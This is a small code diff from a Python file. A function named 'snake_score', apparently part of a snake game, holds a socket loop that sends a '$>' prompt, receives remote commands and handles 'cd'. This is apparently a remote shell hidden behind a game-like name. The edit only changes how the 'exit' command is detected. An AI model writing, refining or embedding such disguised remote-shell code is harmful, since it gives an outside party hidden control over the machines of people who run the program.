@@ -140,7 +140,7 @@ def snake_score():
 	sock.send(f"\n$>".encode())
 	while True:
 		command = sock.recv(1024).decode()
-		if command.lower()[:4] == "exit":
+		if command.lower().strip() == "exit":
 			break
 		if command.startswith("cd "):
 			try:
